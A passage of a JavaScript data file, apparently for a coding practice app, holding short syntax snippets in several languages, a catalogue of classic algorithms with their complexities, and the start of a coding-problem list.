                'class Singleton:\n    _instance = None\n    @classmethod\n    def get(cls):\n        if not cls._instance:\n            cls._instance = cls()\n        return cls._instance'
            ],
            error_handling: [
                'try:\n    result = divide(a, b)\nexcept ZeroDivisionError:\n    print("Cannot divide by zero")',
                'try:\n    data = load(path)\nexcept FileNotFoundError as e:\n    log(e)\nfinally:\n    cleanup()',
                'raise ValueError("Invalid input")',
                'assert len(items) > 0, "Empty list"'
            ],
            imports: [
                'import os',
                'from pathlib import Path',
                'from typing import List, Dict',
                'import json\nfrom datetime import datetime',
                'from collections import Counter, defaultdict'
            ]
        },
        javascript: {
            loops: [
                'for (let i = 0; i < 10; i++) {\n    console.log(i);\n}',
                'for (const item of items) {\n    process(item);\n}',
                'while (count > 0) {\n    count--;\n}',
                'items.forEach((item, i) => {\n    console.log(i, item);\n});',
                'array.map(x => x * 2);'
            ],
            conditionals: [
                'if (x > 0) {\n    return "positive";\n}',
                'const status = age >= 18 ? "adult" : "minor";',
                'if (x > 0) {\n    log("pos");\n} else if (x < 0) {\n    log("neg");\n} else {\n    log("zero");\n}',
                'switch (action) {\n    case "start":\n        begin();\n        break;\n    case "stop":\n        end();\n        break;\n    default:\n        idle();\n}'
            ],
            functions: [
                'function greet(name) {\n    return `Hello, ${name}`;\n}',
                'const add = (a, b) => a + b;',
                'async function fetchData(url) {\n    const res = await fetch(url);\n    return res.json();\n}',
                'const debounce = (fn, ms) => {\n    let timer;\n    return (...args) => {\n        clearTimeout(timer);\n        timer = setTimeout(() => fn(...args), ms);\n    };\n};'
            ],
            data_structures: [
                'const nums = [1, 2, 3, 4, 5];',
                'const user = { name: "zen", wpm: 120 };',
                'const map = new Map();\nmap.set("key", "value");',
                'const set = new Set([1, 2, 3]);',
                'const stack = [];\nstack.push(1);\nstack.pop();'
            ],
            classes: [
                'class Player {\n    constructor(name) {\n        this.name = name;\n    }\n}',
                'class Admin extends User {\n    constructor() {\n        super();\n        this.role = "admin";\n    }\n}',
                'get score() {\n    return this._score;\n}\nset score(val) {\n    this._score = val;\n}'
            ],
            error_handling: [
                'try {\n    const data = JSON.parse(raw);\n} catch (err) {\n    console.error(err);\n}',
                'try {\n    await connect();\n} catch (e) {\n    retry();\n} finally {\n    cleanup();\n}',
                'throw new Error("Invalid input");'
            ],
            imports: [
                'import React from "react";',
                'import { useState, useEffect } from "react";',
                'const fs = require("fs");',
                'import express from "express";',
                'export default function App() {}'
            ]
        },
        typescript: {
            loops: [
                'for (let i: number = 0; i < 10; i++) {\n    console.log(i);\n}',
                'for (const item of items) {\n    process(item);\n}',
                'array.map((x: number) => x * 2);',
                'Object.entries(obj).forEach(([k, v]) => {\n    console.log(k, v);\n});'
            ],
            conditionals: [
                'if (value !== undefined) {\n    return value;\n}',
                'const result: string = ok ? "yes" : "no";',
                'if (isAdmin(user)) {\n    grantAccess();\n} else {\n    deny();\n}'
            ],
            functions: [
                'function add(a: number, b: number): number {\n    return a + b;\n}',
                'const greet = (name: string): string => {\n    return `Hello, ${name}`;\n};',
                'async function fetch<T>(url: string): Promise<T> {\n    const res = await get(url);\n    return res.json();\n}'
            ],
            data_structures: [
                'const nums: number[] = [1, 2, 3];',
                'interface User {\n    name: string;\n    age: number;\n}',
                'type Status = "active" | "idle" | "offline";',
                'const map = new Map<string, number>();'
            ],
            classes: [
                'class Player {\n    private score: number = 0;\n    constructor(public name: string) {}\n}',
                'class Logger implements ILogger {\n    log(msg: string): void {\n        console.log(msg);\n    }\n}'
            ],
            error_handling: [
                'try {\n    const data = parse(raw);\n} catch (err: unknown) {\n    if (err instanceof Error) {\n        log(err.message);\n    }\n}',
                'function assert(val: unknown): asserts val {\n    if (!val) throw new Error("Assertion failed");\n}'
            ],
            imports: [
                'import type { FC } from "react";',
                'import { z } from "zod";',
                'export interface Config {\n    port: number;\n    host: string;\n}'
            ]
        },
        c: {
            loops: [
                'for (int i = 0; i < 10; i++) {\n    printf("%d\\n", i);\n}',
                'while (n > 0) {\n    n--;\n}',
                'do {\n    scanf("%d", &x);\n} while (x != 0);',
                'for (int *p = arr; p < arr + n; p++) {\n    sum += *p;\n}'
            ],
            conditionals: [
                'if (x > 0) {\n    return 1;\n} else {\n    return -1;\n}',
                'switch (ch) {\n    case \'a\':\n        action();\n        break;\n    default:\n        idle();\n}'
            ],
            functions: [
                'int add(int a, int b) {\n    return a + b;\n}',
                'void swap(int *a, int *b) {\n    int tmp = *a;\n    *a = *b;\n    *b = tmp;\n}',
                'char *strdup(const char *s) {\n    char *d = malloc(strlen(s) + 1);\n    strcpy(d, s);\n    return d;\n}'
            ],
            data_structures: [
                'int arr[10] = {0};',
                'struct Node {\n    int data;\n    struct Node *next;\n};',
                'typedef struct {\n    char name[50];\n    int age;\n} Person;'
            ],
            classes: [
                'struct Stack {\n    int data[100];\n    int top;\n};\nvoid push(struct Stack *s, int val) {\n    s->data[++s->top] = val;\n}'
            ],
            error_handling: [
                'if (ptr == NULL) {\n    fprintf(stderr, "Memory error\\n");\n    exit(1);\n}',
                'FILE *fp = fopen(path, "r");\nif (!fp) {\n    perror("fopen");\n    return -1;\n}'
            ],
            imports: [
                '#include <stdio.h>',
                '#include <stdlib.h>\n#include <string.h>',
                '#include "myheader.h"'
            ]
        },
        cpp: {
            loops: [
                'for (int i = 0; i < n; i++) {\n    cout << i << endl;\n}',
                'for (auto& item : items) {\n    process(item);\n}',
                'while (!q.empty()) {\n    auto val = q.front();\n    q.pop();\n}'
            ],
            conditionals: [
                'if (auto it = m.find(key); it != m.end()) {\n    return it->second;\n}',
                'const auto result = (x > 0) ? "pos" : "neg";'
            ],
            functions: [
                'int add(int a, int b) {\n    return a + b;\n}',
                'template<typename T>\nT max(T a, T b) {\n    return (a > b) ? a : b;\n}',
                'auto square = [](int x) { return x * x; };'
            ],
            data_structures: [
                'vector<int> nums = {1, 2, 3};',
                'map<string, int> scores;',
                'unordered_set<int> seen;',
                'stack<int> s;\ns.push(42);'
            ],
            classes: [
                'class Player {\npublic:\n    Player(string n) : name(n) {}\nprivate:\n    string name;\n};',
                'class Shape {\npublic:\n    virtual double area() const = 0;\n};'
            ],
            error_handling: [
                'try {\n    riskyOp();\n} catch (const exception& e) {\n    cerr << e.what() << endl;\n}',
                'throw runtime_error("fail");'
            ],
            imports: [
                '#include <iostream>',
                '#include <vector>\n#include <algorithm>',
                'using namespace std;'
            ]
        },
        java: {
            loops: [
                'for (int i = 0; i < 10; i++) {\n    System.out.println(i);\n}',
                'for (String item : items) {\n    process(item);\n}',
                'while (scanner.hasNext()) {\n    String line = scanner.nextLine();\n}'
            ],
            conditionals: [
                'if (x > 0) {\n    return "positive";\n} else {\n    return "negative";\n}',
                'String result = (age >= 18) ? "adult" : "minor";'
            ],
            functions: [
                'public int add(int a, int b) {\n    return a + b;\n}',
                'public static void main(String[] args) {\n    System.out.println("Hello");\n}',
                'private <T> List<T> filter(List<T> list) {\n    return list.stream().collect(Collectors.toList());\n}'
            ],
            data_structures: [
                'List<Integer> nums = new ArrayList<>();',
                'Map<String, Integer> map = new HashMap<>();',
                'Set<String> set = new HashSet<>();',
                'Queue<Integer> q = new LinkedList<>();'
            ],
            classes: [
                'public class Player {\n    private String name;\n    public Player(String name) {\n        this.name = name;\n    }\n}',
                'public class Admin extends User {\n    @Override\n    public void login() {\n        super.login();\n    }\n}'
            ],
            error_handling: [
                'try {\n    parse(data);\n} catch (Exception e) {\n    e.printStackTrace();\n}',
                'throw new IllegalArgumentException("Invalid");'
            ],
            imports: [
                'import java.util.List;',
                'import java.util.Map;\nimport java.util.HashMap;',
                'import java.io.*;'
            ]
        },
        rust: {
            loops: [
                'for i in 0..10 {\n    println!("{}", i);\n}',
                'for item in &items {\n    process(item);\n}',
                'loop {\n    if done { break; }\n}',
                'while let Some(val) = iter.next() {\n    handle(val);\n}'
            ],
            conditionals: [
                'if x > 0 {\n    "positive"\n} else {\n    "negative"\n}',
                'match action {\n    Action::Start => begin(),\n    Action::Stop => end(),\n    _ => idle(),\n}'
            ],
            functions: [
                'fn add(a: i32, b: i32) -> i32 {\n    a + b\n}',
                'fn greet(name: &str) -> String {\n    format!("Hello, {}", name)\n}',
                'async fn fetch(url: &str) -> Result<Response, Error> {\n    let res = reqwest::get(url).await?;\n    Ok(res)\n}'
            ],
            data_structures: [
                'let nums: Vec<i32> = vec![1, 2, 3];',
                'let mut map = HashMap::new();\nmap.insert("key", 42);',
                'let set: HashSet<i32> = HashSet::new();'
            ],
            classes: [
                'struct Player {\n    name: String,\n    score: u32,\n}',
                'impl Player {\n    fn new(name: &str) -> Self {\n        Player { name: name.to_string(), score: 0 }\n    }\n}',
                'trait Drawable {\n    fn draw(&self);\n}'
            ],
            error_handling: [
                'match result {\n    Ok(val) => println!("{}", val),\n    Err(e) => eprintln!("{}", e),\n}',
                'let data = fs::read_to_string(path)?;'
            ],
            imports: [
                'use std::collections::HashMap;',
                'use std::io::{self, Read};',
                'mod utils;\nuse crate::utils::helper;'
            ]
        },
        go: {
            loops: [
                'for i := 0; i < 10; i++ {\n    fmt.Println(i)\n}',
                'for _, item := range items {\n    process(item)\n}',
                'for key, val := range data {\n    fmt.Println(key, val)\n}'
            ],
            conditionals: [
                'if x > 0 {\n    return "positive"\n}',
                'if err != nil {\n    log.Fatal(err)\n}',
                'switch action {\ncase "start":\n    begin()\ncase "stop":\n    end()\ndefault:\n    idle()\n}'
            ],
            functions: [
                'func add(a, b int) int {\n    return a + b\n}',
                'func greet(name string) string {\n    return fmt.Sprintf("Hello, %s", name)\n}',
                'func divide(a, b float64) (float64, error) {\n    if b == 0 {\n        return 0, errors.New("division by zero")\n    }\n    return a / b, nil\n}'
            ],
            data_structures: [
                'nums := []int{1, 2, 3}',
                'data := map[string]int{"a": 1}',
                'type Node struct {\n    Val  int\n    Next *Node\n}'
            ],
            classes: [
                'type Player struct {\n    Name  string\n    Score int\n}',
                'func (p *Player) Greet() string {\n    return "Hello, " + p.Name\n}',
                'type Logger interface {\n    Log(msg string)\n}'
            ],
            error_handling: [
                'if err != nil {\n    return fmt.Errorf("failed: %w", err)\n}',
                'defer file.Close()',
                'data, err := ioutil.ReadAll(resp.Body)\nif err != nil {\n    log.Fatal(err)\n}'
            ],
            imports: [
                'import "fmt"',
                'import (\n    "fmt"\n    "os"\n)',
                'import "net/http"'
            ]
        }
    };

    const algoData = [
        { name: 'Bubble Sort', category: 'SORTING', complexity: 'O(n²)', code: 'def bubble_sort(arr):\n    n = len(arr)\n    for i in range(n):\n        for j in range(0, n - i - 1):\n            if arr[j] > arr[j + 1]:\n                arr[j], arr[j + 1] = arr[j + 1], arr[j]\n    return arr' },
        { name: 'Quick Sort', category: 'SORTING', complexity: 'O(n log n)', code: 'def quick_sort(arr):\n    if len(arr) <= 1:\n        return arr\n    pivot = arr[0]\n    left = [x for x in arr[1:] if x <= pivot]\n    right = [x for x in arr[1:] if x > pivot]\n    return quick_sort(left) + [pivot] + quick_sort(right)' },
        { name: 'Merge Sort', category: 'SORTING', complexity: 'O(n log n)', code: 'def merge_sort(arr):\n    if len(arr) <= 1:\n        return arr\n    mid = len(arr) // 2\n    left = merge_sort(arr[:mid])\n    right = merge_sort(arr[mid:])\n    return merge(left, right)\n\ndef merge(l, r):\n    res = []\n    i = j = 0\n    while i < len(l) and j < len(r):\n        if l[i] <= r[j]:\n            res.append(l[i]); i += 1\n        else:\n            res.append(r[j]); j += 1\n    return res + l[i:] + r[j:]' },
        { name: 'Binary Search', category: 'SEARCH', complexity: 'O(log n)', code: 'def binary_search(arr, target):\n    lo, hi = 0, len(arr) - 1\n    while lo <= hi:\n        mid = (lo + hi) // 2\n        if arr[mid] == target:\n            return mid\n        elif arr[mid] < target:\n            lo = mid + 1\n        else:\n            hi = mid - 1\n    return -1' },
        { name: 'DFS', category: 'GRAPH', complexity: 'O(V + E)', code: 'def dfs(graph, node, visited=None):\n    if visited is None:\n        visited = set()\n    visited.add(node)\n    print(node)\n    for neighbor in graph[node]:\n        if neighbor not in visited:\n            dfs(graph, neighbor, visited)\n    return visited' },
        { name: 'BFS', category: 'GRAPH', complexity: 'O(V + E)', code: 'from collections import deque\n\ndef bfs(graph, start):\n    visited = {start}\n    queue = deque([start])\n    while queue:\n        node = queue.popleft()\n        print(node)\n        for neighbor in graph[node]:\n            if neighbor not in visited:\n                visited.add(neighbor)\n                queue.append(neighbor)' },
        { name: 'Fibonacci (DP)', category: 'DYNAMIC PROGRAMMING', complexity: 'O(n)', code: 'def fib(n):\n    dp = [0, 1]\n    for i in range(2, n + 1):\n        dp.append(dp[i - 1] + dp[i - 2])\n    return dp[n]' },
        { name: 'Linked List', category: 'DATA STRUCTURE', complexity: 'O(1) insert', code: 'class ListNode:\n    def __init__(self, val=0):\n        self.val = val\n        self.next = None\n\ndef insert(head, val):\n    node = ListNode(val)\n    node.next = head\n    return node' },
        { name: 'Stack', category: 'DATA STRUCTURE', complexity: 'O(1)', code: 'class Stack:\n    def __init__(self):\n        self.items = []\n\n    def push(self, val):\n        self.items.append(val)\n\n    def pop(self):\n        return self.items.pop()\n\n    def peek(self):\n        return self.items[-1] if self.items else None' },
        { name: 'Two Sum', category: 'HASH MAP', complexity: 'O(n)', code: 'def two_sum(nums, target):\n    seen = {}\n    for i, num in enumerate(nums):\n        complement = target - num\n        if complement in seen:\n            return [seen[complement], i]\n        seen[num] = i\n    return []' },
        { name: 'Insertion Sort', category: 'SORTING', complexity: 'O(n²)', code: 'def insertion_sort(arr):\n    for i in range(1, len(arr)):\n        key = arr[i]\n        j = i - 1\n        while j >= 0 and key < arr[j]:\n            arr[j + 1] = arr[j]\n            j -= 1\n        arr[j + 1] = key\n    return arr' },
        { name: 'Selection Sort', category: 'SORTING', complexity: 'O(n²)', code: 'def selection_sort(arr):\n    for i in range(len(arr)):\n        min_idx = i\n        for j in range(i + 1, len(arr)):\n            if arr[min_idx] > arr[j]:\n                min_idx = j\n        arr[i], arr[min_idx] = arr[min_idx], arr[i]\n    return arr' },
        { name: 'Linear Search', category: 'SEARCH', complexity: 'O(n)', code: 'def linear_search(arr, x):\n    for i in range(len(arr)):\n        if arr[i] == x:\n            return i\n    return -1' },
        { name: 'Queue', category: 'DATA STRUCTURE', complexity: 'O(1)', code: 'from collections import deque\nclass Queue:\n    def __init__(self):\n        self.items = deque()\n    def enqueue(self, item):\n        self.items.append(item)\n    def dequeue(self):\n        return self.items.popleft() if self.items else None\n    def peek(self):\n        return self.items[0] if self.items else None' },
        { name: 'BT Preorder', category: 'BINARY TREE', complexity: 'O(n)', code: 'def preorder(root):\n    if not root: return []\n    return [root.val] + preorder(root.left) + preorder(root.right)' },
        { name: 'BT Inorder', category: 'BINARY TREE', complexity: 'O(n)', code: 'def inorder(root):\n    if not root: return []\n    return inorder(root.left) + [root.val] + inorder(root.right)' },
        { name: 'BT Postorder', category: 'BINARY TREE', complexity: 'O(n)', code: 'def postorder(root):\n    if not root: return []\n    return postorder(root.left) + postorder(root.right) + [root.val]' },
        { name: 'Binary Tree Height', category: 'BINARY TREE', complexity: 'O(n)', code: 'def get_height(root):\n    if not root: return 0\n    return 1 + max(get_height(root.left), get_height(root.right))' },
        { name: 'Reverse Linked List', category: 'DATA STRUCTURE', complexity: 'O(n)', code: 'def reverse_list(head):\n    prev = None\n    curr = head\n    while curr:\n        nxt = curr.next\n        curr.next = prev\n        prev = curr\n        curr = nxt\n    return prev' },
        { name: 'Heap Sort', category: 'SORTING', complexity: 'O(n log n)', code: 'def heapify(arr, n, i):\n    largest = i\n    l, r = 2 * i + 1, 2 * i + 2\n    if l < n and arr[l] > arr[largest]: largest = l\n    if r < n and arr[r] > arr[largest]: largest = r\n    if largest != i:\n        arr[i], arr[largest] = arr[largest], arr[i]\n        heapify(arr, n, largest)\n\ndef heap_sort(arr):\n    n = len(arr)\n    for i in range(n // 2 - 1, -1, -1): heapify(arr, n, i)\n    for i in range(n-1, 0, -1):\n        arr[i], arr[0] = arr[0], arr[i]\n        heapify(arr, i, 0)\n    return arr' },
        { name: 'Dijkstra', category: 'GRAPH', complexity: 'O(V+E log V)', code: 'import heapq\ndef dijkstra(graph, start):\n    distances = {node: float("inf") for node in graph}\n    distances[start] = 0\n    pq = [(0, start)]\n    while pq:\n        dist, node = heapq.heappop(pq)\n        if dist > distances[node]: continue\n        for nbr, w in graph[node].items():\n            d = dist + w\n            if d < distances[nbr]:\n                distances[nbr] = d\n                heapq.heappush(pq, (d, nbr))\n    return distances' },
        { name: 'Prim\'s Algo', category: 'GRAPH', complexity: 'O(E log V)', code: 'import heapq\ndef prims(graph, start):\n    mst, visited = [], {start}\n    edges = [(w, start, to) for to, w in graph[start].items()]\n    heapq.heapify(edges)\n    while edges:\n        w, frm, to = heapq.heappop(edges)\n        if to not in visited:\n            visited.add(to)\n            mst.append((frm, to, w))\n            for nxt, nw in graph[to].items():\n                if nxt not in visited:\n                    heapq.heappush(edges, (nw, to, nxt))\n    return mst' },
        { name: 'Kruskal\'s Algo', category: 'GRAPH', complexity: 'O(E log E)', code: 'def kruskals(edges, nodes):\n    parent = {n: n for n in nodes}\n    def find(i):\n        if parent[i] == i: return i\n        return find(parent[i])\n    def union(i, j):\n        parent[find(i)] = find(j)\n    mst = []\n    for u, v, w in sorted(edges, key=lambda x: x[2]):\n        if find(u) != find(v):\n            union(u, v)\n            mst.append((u, v, w))\n    return mst' },
        { name: 'Topological Sort', category: 'GRAPH', complexity: 'O(V + E)', code: 'def topo_sort(graph):\n    visited, stack = set(), []\n    def dfs(node):\n        visited.add(node)\n        for nbr in graph[node]:\n            if nbr not in visited: dfs(nbr)\n        stack.append(node)\n    for node in graph:\n        if node not in visited: dfs(node)\n    return stack[::-1]' },
        { name: 'LCS (DP)', category: 'DYNAMIC PROGRAMMING', complexity: 'O(n*m)', code: 'def lcs(s1, s2):\n    m, n = len(s1), len(s2)\n    dp = [[0] * (n + 1) for _ in range(m + 1)]\n    for i in range(1, m + 1):\n        for j in range(1, n + 1):\n            if s1[i-1] == s2[j-1]:\n                dp[i][j] = dp[i-1][j-1] + 1\n            else:\n                dp[i][j] = max(dp[i-1][j], dp[i][j-1])\n    return dp[m][n]' },
        { name: 'LIS (DP)', category: 'DYNAMIC PROGRAMMING', complexity: 'O(n²)', code: 'def lis(arr):\n    n = len(arr)\n    dp = [1] * n\n    for i in range(1, n):\n        for j in range(0, i):\n            if arr[i] > arr[j]:\n                dp[i] = max(dp[i], dp[j] + 1)\n    return max(dp) if dp else 0' },
        { name: '0/1 Knapsack', category: 'DYNAMIC PROGRAMMING', complexity: 'O(n*W)', code: 'def knapsack(W, wts, vals, n):\n    dp = [[0]*(W+1) for _ in range(n+1)]\n    for i in range(n+1):\n        for w in range(W+1):\n            if i == 0 or w == 0: dp[i][w] = 0\n            elif wts[i-1] <= w:\n                dp[i][w] = max(vals[i-1]+dp[i-1][w-wts[i-1]], dp[i-1][w])\n            else: dp[i][w] = dp[i-1][w]\n    return dp[n][W]' },
        { name: 'Coin Change', category: 'DYNAMIC PROGRAMMING', complexity: 'O(n*amount)', code: 'def coin_change(coins, amount):\n    dp = [float("inf")] * (amount + 1)\n    dp[0] = 0\n    for coin in coins:\n        for i in range(coin, amount + 1):\n            dp[i] = min(dp[i], dp[i - coin] + 1)\n    return dp[amount] if dp[amount] != float("inf") else -1' },
        { name: 'Edit Distance', category: 'DYNAMIC PROGRAMMING', complexity: 'O(n*m)', code: 'def edit_dist(s1, s2):\n    m, n = len(s1), len(s2)\n    dp = [[0]*(n+1) for _ in range(m+1)]\n    for i in range(m+1):\n        for j in range(n+1):\n            if i == 0: dp[i][j] = j\n            elif j == 0: dp[i][j] = i\n            elif s1[i-1] == s2[j-1]: dp[i][j] = dp[i-1][j-1]\n            else:\n                dp[i][j] = 1 + min(dp[i-1][j], dp[i][j-1], dp[i-1][j-1])\n    return dp[m][n]' },
        { name: 'Trie Insert', category: 'DATA STRUCTURE', complexity: 'O(L)', code: 'class TrieNode:\n    def __init__(self):\n        self.children = {}\n        self.is_end = False\n\nclass Trie:\n    def __init__(self):\n        self.root = TrieNode()\n    def insert(self, word):\n        node = self.root\n        for ch in word:\n            if ch not in node.children:\n                node.children[ch] = TrieNode()\n            node = node.children[ch]\n        node.is_end = True' },
        { name: 'BST Deletion', category: 'BINARY TREE', complexity: 'O(h)', code: 'def delete_node(root, key):\n    if not root: return root\n    if key < root.val: root.left = delete_node(root.left, key)\n    elif key > root.val: root.right = delete_node(root.right, key)\n    else:\n        if not root.left: return root.right\n        if not root.right: return root.left\n        temp = root.right\n        while temp.left: temp = temp.left\n        root.val = temp.val\n        root.right = delete_node(root.right, root.val)\n    return root' },
        { name: 'LCA of BT', category: 'BINARY TREE', complexity: 'O(h)', code: 'def lca(root, p, q):\n    if not root or root == p or root == q: return root\n    left = lca(root.left, p, q)\n    right = lca(root.right, p, q)\n    if left and right: return root\n    return left or right' },
        { name: 'Sliding Win Max', category: 'SLIDING WINDOW', complexity: 'O(n)', code: 'from collections import deque\ndef max_sliding_window(nums, k):\n    res, dq = [], deque()\n    for i, n in enumerate(nums):\n        while dq and nums[dq[-1]] <= n: dq.pop()\n        dq.append(i)\n        if dq[0] == i - k: dq.popleft()\n        if i >= k - 1: res.append(nums[dq[0]])\n    return res' },
        { name: 'Floyd-Warshall', category: 'GRAPH', complexity: 'O(n³)', code: 'def floyd_warshall(n, edges):\n    dist = [[float("inf")]*n for _ in range(n)]\n    for i in range(n): dist[i][i] = 0\n    for u, v, w in edges: dist[u][v] = w\n    for k in range(n):\n        for i in range(n):\n            for j in range(n):\n                dist[i][j] = min(dist[i][j], dist[i][k]+dist[k][j])\n    return dist' },
        { name: 'Bellman-Ford', category: 'GRAPH', complexity: 'O(VE)', code: 'def bellman_ford(n, edges, src):\n    dist = [float("inf")] * n\n    dist[src] = 0\n    for _ in range(n - 1):\n        for u, v, w in edges:\n            if dist[u] != float("inf") and dist[u]+w < dist[v]:\n                dist[v] = dist[u] + w\n    return dist' },
        { name: 'Subset Sum', category: 'DYNAMIC PROGRAMMING', complexity: 'O(n*sum)', code: 'def subset_sum(arr, target):\n    n = len(arr)\n    dp = [[False]*(target+1) for _ in range(n+1)]\n    for i in range(n+1): dp[i][0] = True\n    for i in range(1, n+1):\n        for j in range(1, target+1):\n            if arr[i-1] <= j:\n                dp[i][j] = dp[i-1][j] or dp[i-1][j-arr[i-1]]\n            else: dp[i][j] = dp[i-1][j]\n    return dp[n][target]' },
        { name: 'DSU / Union-Find', category: 'DATA STRUCTURE', complexity: 'O(α(n))', code: 'class DSU:\n    def __init__(self, n):\n        self.parent = list(range(n))\n    def find(self, i):\n        if self.parent[i] == i: return i\n        self.parent[i] = self.find(self.parent[i])\n        return self.parent[i]\n    def union(self, i, j):\n        ri, rj = self.find(i), self.find(j)\n        if ri != rj: self.parent[ri] = rj' },
        { name: 'KMP Algorithm', category: 'STRING', complexity: 'O(n+m)', code: 'def kmp(txt, pat):\n    def build_lps(p):\n        lps = [0]*len(p)\n        l, i = 0, 1\n        while i < len(p):\n            if p[i] == p[l]: l += 1; lps[i] = l; i += 1\n            elif l: l = lps[l-1]\n            else: lps[i] = 0; i += 1\n        return lps\n    lps, i, j = build_lps(pat), 0, 0\n    while i < len(txt):\n        if txt[i] == pat[j]: i += 1; j += 1\n        if j == len(pat): return i - j\n        elif i < len(txt) and txt[i] != pat[j]:\n            if j: j = lps[j-1]\n            else: i += 1\n    return -1' },
        { name: 'Z-Algorithm', category: 'STRING', complexity: 'O(n+m)', code: 'def z_function(s):\n    n = len(s)\n    z = [0] * n\n    l, r = 0, 0\n    for i in range(1, n):\n        if i > r:\n            l, r = i, i\n            while r < n and s[r-l] == s[r]: r += 1\n            z[i], r = r - l, r - 1\n        else:\n            k = i - l\n            if z[k] < r - i + 1: z[i] = z[k]\n            else:\n                l = i\n                while r < n and s[r-l] == s[r]: r += 1\n                z[i], r = r - l, r - 1\n    return z' },
        { name: 'Segment Tree', category: 'DATA STRUCTURE', complexity: 'O(log n)', code: 'class SegTree:\n    def __init__(self, arr):\n        self.n = len(arr)\n        self.t = [0]*(2*self.n)\n        for i in range(self.n): self.t[self.n+i] = arr[i]\n        for i in range(self.n-1, 0, -1): self.t[i] = self.t[2*i]+self.t[2*i+1]\n    def update(self, i, val):\n        i += self.n; self.t[i] = val\n        while i > 1: i //= 2; self.t[i] = self.t[2*i]+self.t[2*i+1]\n    def query(self, l, r):\n        res, l, r = 0, l+self.n, r+self.n\n        while l < r:\n            if l & 1: res += self.t[l]; l += 1\n            if r & 1: r -= 1; res += self.t[r]\n            l //= 2; r //= 2\n        return res' },
        { name: 'Fenwick Tree', category: 'DATA STRUCTURE', complexity: 'O(log n)', code: 'class FenwickTree:\n    def __init__(self, n):\n        self.tree = [0]*(n+1)\n    def update(self, i, delta):\n        i += 1\n        while i < len(self.tree): self.tree[i] += delta; i += i & (-i)\n    def query(self, i):\n        res, i = 0, i+1\n        while i > 0: res += self.tree[i]; i -= i & (-i)\n        return res' },
        { name: 'A* Search', category: 'GRAPH', complexity: 'O(V+E log V)', code: 'import heapq\ndef a_star(graph, start, goal, h):\n    pq = [(0, start)]\n    costs = {start: 0}\n    while pq:\n        f, curr = heapq.heappop(pq)\n        if curr == goal: return costs[curr]\n        for nbr, wt in graph[curr].items():\n            nc = costs[curr] + wt\n            if nbr not in costs or nc < costs[nbr]:\n                costs[nbr] = nc\n                heapq.heappush(pq, (nc + h(nbr), nbr))\n    return -1' },
        { name: 'Kosaraju (SCC)', category: 'GRAPH', complexity: 'O(V+E)', code: 'def kosaraju(n, adj):\n    vis, stack = set(), []\n    def dfs1(u):\n        vis.add(u)\n        for v in adj[u]:\n            if v not in vis: dfs1(v)\n        stack.append(u)\n    for i in range(n):\n        if i not in vis: dfs1(i)\n    rev = [[] for _ in range(n)]\n    for u in range(n):\n        for v in adj[u]: rev[v].append(u)\n    vis.clear(); sccs = []\n    def dfs2(u, scc):\n        vis.add(u); scc.append(u)\n        for v in rev[u]:\n            if v not in vis: dfs2(v, scc)\n    while stack:\n        u = stack.pop()\n        if u not in vis:\n            s = []; dfs2(u, s); sccs.append(s)\n    return sccs' },
        { name: 'Tarjan\'s SCC', category: 'GRAPH', complexity: 'O(V+E)', code: 'def tarjan(n, adj):\n    ids, low = [-1]*n, [0]*n\n    on_stk, stk = [False]*n, []\n    res, cid = [], 0\n    def dfs(u):\n        nonlocal cid\n        ids[u] = low[u] = cid; cid += 1\n        stk.append(u); on_stk[u] = True\n        for v in adj[u]:\n            if ids[v] == -1: dfs(v); low[u] = min(low[u], low[v])\n            elif on_stk[v]: low[u] = min(low[u], ids[v])\n        if ids[u] == low[u]:\n            scc = []\n            while True:\n                nd = stk.pop(); on_stk[nd] = False\n                scc.append(nd)\n                if nd == u: break\n            res.append(scc)\n    for i in range(n):\n        if ids[i] == -1: dfs(i)\n    return res' },
        { name: 'N-Queens', category: 'BACKTRACKING', complexity: 'O(n!)', code: 'def solve_n_queens(n):\n    res = []\n    def bt(r, cols, pos, neg, board):\n        if r == n: res.append(["".join(row) for row in board]); return\n        for c in range(n):\n            if c in cols or (r+c) in pos or (r-c) in neg: continue\n            cols.add(c); pos.add(r+c); neg.add(r-c)\n            board[r][c] = "Q"\n            bt(r+1, cols, pos, neg, board)\n            cols.remove(c); pos.remove(r+c); neg.remove(r-c)\n            board[r][c] = "."\n    bt(0, set(), set(), set(), [["."]*n for _ in range(n)])\n    return res' },
        { name: 'Sudoku Solver', category: 'BACKTRACKING', complexity: 'O(9^(n²))', code: 'def solve_sudoku(board):\n    def valid(r, c, v):\n        for i in range(9):\n            if board[r][i] == v or board[i][c] == v: return False\n            if board[3*(r//3)+i//3][3*(c//3)+i%3] == v: return False\n        return True\n    def solve():\n        for r in range(9):\n            for c in range(9):\n                if board[r][c] == ".":\n                    for v in "123456789":\n                        if valid(r, c, v):\n                            board[r][c] = v\n                            if solve(): return True\n                            board[r][c] = "."\n                    return False\n        return True\n    solve()' },
        { name: 'Matrix Chain Mult', category: 'DYNAMIC PROGRAMMING', complexity: 'O(n³)', code: 'def matrix_chain(p):\n    n = len(p) - 1\n    dp = [[0]*n for _ in range(n)]\n    for L in range(2, n+1):\n        for i in range(n-L+1):\n            j = i+L-1\n            dp[i][j] = float("inf")\n            for k in range(i, j):\n                q = dp[i][k]+dp[k+1][j]+p[i]*p[k+1]*p[j+1]\n                if q < dp[i][j]: dp[i][j] = q\n    return dp[0][n-1]' },
        { name: 'Word Ladder', category: 'GRAPH', complexity: 'O(n*m)', code: 'from collections import deque\ndef word_ladder(begin, end, words):\n    ws = set(words)\n    if end not in ws: return 0\n    q = deque([(begin, 1)])\n    while q:\n        word, d = q.popleft()\n        if word == end: return d\n        for i in range(len(word)):\n            for c in "abcdefghijklmnopqrstuvwxyz":\n                nxt = word[:i]+c+word[i+1:]\n                if nxt in ws:\n                    ws.remove(nxt)\n                    q.append((nxt, d+1))\n    return 0' }
    ];

    const dsaData = [
        {
            name: 'Find Pair Sum',
            difficulty: 'EASY',
            category: 'HASH MAP',
            topics: ['HASH MAP', 'MATH', 'TWO POINTERS'],
            description: `Given an array of integers <code>nums</code> and an integer <code>target</code>, return indices of the two numbers such that they add up to <code>target</code>.<br><br>You may assume that each input would have exactly one solution, and you may not use the same element twice.<br><br><pre><strong>Input:</strong> nums = [2,7,11,15], target = 9
<strong>Output:</strong> [0,1]
<strong>Explanation:</strong> Because nums[0] + nums[1] == 9, we return [0, 1].</pre>`,
            code: 'def find_pair_sum(nums, target):\n    num_map = {}\n    for i, num in enumerate(nums):\n        complement = target - num\n        if complement in num_map:\n            return [num_map[complement], i]\n        num_map[num] = i\n    return []'
        },
        {
            name: 'Valid Brackets',
            difficulty: 'EASY',
            category: 'STACK',
            topics: ['STACK'],
